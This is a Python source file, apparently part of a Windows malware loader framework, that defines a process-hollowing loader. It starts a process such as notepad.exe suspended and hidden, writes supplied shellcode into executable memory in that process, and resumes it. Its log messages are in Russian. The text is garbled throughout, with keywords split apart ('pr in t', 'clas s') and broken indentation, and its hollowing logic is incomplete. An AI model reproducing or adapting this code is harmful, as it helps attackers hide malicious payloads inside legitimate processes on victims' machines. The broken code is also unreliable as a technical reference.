import os



import ctypes



from typ in gimport List,Optional







from core.interfacesimport Bas eLoader







clas sProcessHollow in gLoader(Bas eLoader):











def__init__(self):







        self.kernel32=ctypes.w in dll.kernel32



self.ntdll=ctypes.w in dll.ntdll







defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







hide_console=kwargs.get("hide_console",True)



replace_pe=kwargs.get("replace_pe",False)











if nottarget_process:



            target_process="notepad.exe"











is_pe=self._is_pe_file(payload)











if is_peandreplace_pe:



            return self._process_hollow in g_pe(payload,target_process,hide_console)



else:



            return self._process_hollow in g_shellcode(payload,target_process,hide_console)







def_is_pe_file(self,data:bytes)->bool:











if len(data)<2:



            return False







return data[0:2]==b'MZ'







def_process_hollow in g_shellcode(self,shellcode:bytes,target_process:str,hide_console:bool)->bool:











CREATE_SUSPENDED=0x4



CREATE_NO_WINDOW=0x08000000



PROCESS_ALL_ACCESS=0x1F0FFF



MEM_COMMIT=0x1000



MEM_RESERVE=0x2000



PAGE_EXECUTE_READWRITE=0x40







try:







            clas sSTARTUPINFO(ctypes.Structure):



                _fields_=[



("cb",ctypes.c_ulong),



("lpReserved",ctypes.c_void_p),



("lpDesktop",ctypes.c_void_p),



("lpTitle",ctypes.c_void_p),



("dwX",ctypes.c_ulong),



("dwY",ctypes.c_ulong),



("dwXSize",ctypes.c_ulong),



("dwYSize",ctypes.c_ulong),



("dwXCountChars",ctypes.c_ulong),



("dwYCountChars",ctypes.c_ulong),



("dwFillAttribute",ctypes.c_ulong),



("dwFlags",ctypes.c_ulong),



("wShowW in dow",ctypes.c_ushort),



("cbReserved2",ctypes.c_ushort),



("lpReserved2",ctypes.c_void_p),



("hStdInput",ctypes.c_void_p),



("hStdOutput",ctypes.c_void_p),



("hStdError",ctypes.c_void_p)



]







clas sPROCESS_INFORMATION(ctypes.Structure):



                _fields_=[



("hProcess",ctypes.c_void_p),



("hThread",ctypes.c_void_p),



("dwProcessId",ctypes.c_ulong),



("dwThreadId",ctypes.c_ulong)



]











startup_info=STARTUPINFO()



startup_info.cb=ctypes.sizeof(STARTUPINFO)



startup_info.dwFlags=0x1



startup_info.wShowW in dow=0







process_info=PROCESS_INFORMATION()











creation_flags=CREATE_SUSPENDED



if hide_console:



                creation_flags|=CREATE_NO_WINDOW







if notself.kernel32.CreateProcessA(



None,



target_process.encode('utf-8'),



None,



None,



False,



creation_flags,



None,



None,



ctypes.byref(startup_info),



ctypes.byref(process_info)



):



                pr in t(f"Ошибка создания процесса: {ctypes.GetLas tError()}")



return False



















bas e_address=ctypes.c_void_p()



self.ntdll.NtQueryInformationProcess(



process_info.hProcess,



0,



ctypes.byref(bas e_address),



ctypes.sizeof(bas e_address),



None



)











entry_po in t=self.kernel32.VirtualAllocEx(



process_info.hProcess,



None,



len(shellcode),



MEM_COMMIT|MEM_RESERVE,



PAGE_EXECUTE_READWRITE



)







if notentry_po in t:



                pr in t(f"Ошибка выделения памяти: {ctypes.GetLas tError()}")



self.kernel32.Term in ateProcess(process_info.hProcess,1)



self.kernel32.CloseHandle(process_info.hProcess)



self.kernel32.CloseHandle(process_info.hThread)



return False











bytes_written=ctypes.c_size_t(0)



if notself.kernel32.WriteProcessMemory(



process_info.hProcess,



entry_po in t,



shellcode,



len(shellcode),



ctypes.byref(bytes_written)



):



                pr in t(f"Ошибка записи шелл-кода: {ctypes.GetLas tError()}")



self.kernel32.Term in ateProcess(process_info.hProcess,1)



self.kernel32.CloseHandle(process_info.hProcess)



self.kernel32.CloseHandle(process_info.hThread)



return False











clas sCONTEXT(ctypes.Structure):



                _fields_=[



("ContextFlags",ctypes.c_ulong),







]























if self.kernel32.ResumeThread(process_info.hThread)==0xFFFFFFFF:



                pr in t(f"Ошибка возобновления потока: {ctypes.GetLas tError()}")



self.kernel32.Term in ateProcess(process_info.hProcess,1)



self.kernel32.CloseHandle(process_info.hProcess)



self.kernel32.CloseHandle(process_info.hThread)



return False











self.kernel32.CloseHandle(process_info.hProcess)



self.kernel32.CloseHandle(process_info.hThread)







pr in t(f"Process Hollow in g успешно выполнен. Шелл-код запущен в процессе {target_process}.")



return True







except Exceptionas e:



            pr in t(f"Ошибка при выполнении Process Hollow in g: {str(e)}")



return False







def_process_hollow in g_pe(self,pe_data:bytes,target_process:str,hide_console:bool)->bool:



















pr in t("Замена полного PE-образа пока не реализована")



return self._process_hollow in g_shellcode(pe_data,target_process,hide_console)







defsupported_platforms(self)->List[str]:







return["w in dows"]